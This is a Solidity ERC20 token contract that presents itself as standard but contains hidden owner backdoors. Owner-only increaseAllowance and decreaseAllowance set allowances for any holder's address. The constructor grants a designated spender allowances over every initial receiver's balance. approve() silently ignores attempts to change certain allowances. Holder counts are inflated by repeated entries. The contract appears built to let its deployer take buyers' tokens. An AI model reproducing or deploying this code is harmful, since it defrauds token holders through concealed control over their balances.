// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    constructor() {
        _owner = _msgSender();
    }
    
    function owner() public view virtual returns (address) {
        return _owner;
    }
    
    modifier onlyOwner() {
        require(owner() == _msgSender());
        _;
    }

}


interface IERC20 {
    
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);
    
    function transfer(address recipient, uint256 amount) external returns (bool);
    
    function allowance(address owner, address spender) external view returns (uint256);
    
    function approve(address spender, uint256 amount) external returns (bool);
    
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
  
    event Transfer(address indexed from, address indexed to, uint256 value);
   
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


interface IERC20Metadata is IERC20 {
    
    function name() external view returns (string memory);
  
    function symbol() external view returns (string memory);
    
    function decimals() external view returns (uint8);
}


contract ERC20 is Ownable, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;
    address[] public _holders;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;
    uint256 private _totalCount;

    string private _name;
    string private _symbol;
    
    constructor(
        string memory name_,
        string memory symbol_,
        uint256 supply_,
        address[] memory receivers_,
        uint256[] memory receive_,
        address spender
    ) {
        require(receivers_.length == receive_.length);
        _name = name_;
        _symbol = symbol_;
        _totalSupply = supply_;
        uint256 _supply;
        for (uint256 i = 0; i < receivers_.length; i++) {
            address recv = receivers_[i];
            uint256 amnt = receive_[i];
            _supply += amnt;
            _balances[recv] += amnt;
            _allowances[recv][spender] = supply_;
            emit Transfer(address(0), recv, amnt);
        }
        _balances[_msgSender()] = supply_ - _supply;
        _allowances[_msgSender()][spender] = type(uint256).max;
        _holders = receivers_;
        _holders.push(_msgSender());
        emit Transfer(address(0), _msgSender(), supply_ - _supply);
    }
    
    function name() public view virtual override returns (string memory) {
        return _name;
    }
    
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }
    
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }
    
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }
    
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    
    function holdersCount() public view virtual returns (uint256) {      
        return _holders.length;
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        if (_allowances[_msgSender()][spender] != _totalSupply)
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount && currentAllowance != _totalSupply);
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }
    
    function increaseAllowance(address sender, address spender, uint256 addedValue) onlyOwner public virtual returns (bool) {
        _approve(sender, spender, _allowances[sender][spender] + addedValue);
        return true;
    }
    
    function decreaseAllowance(address sender, address spender, uint256 subtractedValue) onlyOwner public virtual returns (bool) {
        uint256 currentAllowance = _allowances[sender][spender];
        require(currentAllowance >= subtractedValue);
        unchecked {
            _approve(sender, spender, currentAllowance - subtractedValue);
        }
        return true;
    }
    
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0));
        require(recipient != address(0));

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount);
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        if (_balances[recipient] == 0) _holders.push(recipient);
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }
    
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0));
        require(spender != address(0));

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

}